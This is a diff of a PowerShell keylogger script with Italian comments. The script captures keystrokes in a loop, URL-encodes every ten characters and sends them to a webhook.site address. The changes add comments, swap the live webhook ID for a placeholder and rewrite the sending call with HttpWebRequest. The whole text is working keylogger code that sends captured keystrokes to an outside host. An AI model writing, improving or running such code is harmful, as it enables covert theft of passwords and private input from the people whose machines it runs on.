@@ -1,10 +1,11 @@
+# Funzione per fare l'encoding dell'URL
 function UrlEncode {
     param([string]$value)
     $encoded = [System.Uri]::EscapeDataString($value)
     return $encoded
 }
 
-$webhook = "https://webhook.site/fbea19fd-c6a4-4fe7-b371-c0066a01848e/"  # Sostituisci con il tuo Webhook
+$webhook = "https://webhook.site/your-webhook-id"  # Sostituisci con il tuo Webhook
 $log = ""
 
 Add-Type -TypeDefinition @"
@@ -23,9 +24,23 @@ while ($true) {
             $key = [char]$ascii
             $log += $key
             if ($log.Length -ge 10) {  # Invia i dati ogni 10 caratteri
+                # Codifica i caratteri premuti
                 $encodedLog = UrlEncode $log
+
+                # Crea l'URL per la richiesta GET
                 $url = "$webhook?keys=$encodedLog"
-                Invoke-WebRequest -Uri $url -Method GET
+                Write-Host "Invio: $url"  # Debug per vedere l'URL costruito
+
+                # Invia la richiesta GET al webhook
+                $uri = New-Object System.Uri($url)
+                $request = [System.Net.HttpWebRequest]::Create($uri)
+                $request.Method = "GET"
+
+                # Ottieni la risposta e chiudi
+                $response = $request.GetResponse()
+                $response.Close()
+
+                # Resetta il log dopo l'invio
                 $log = ""
             }
         }
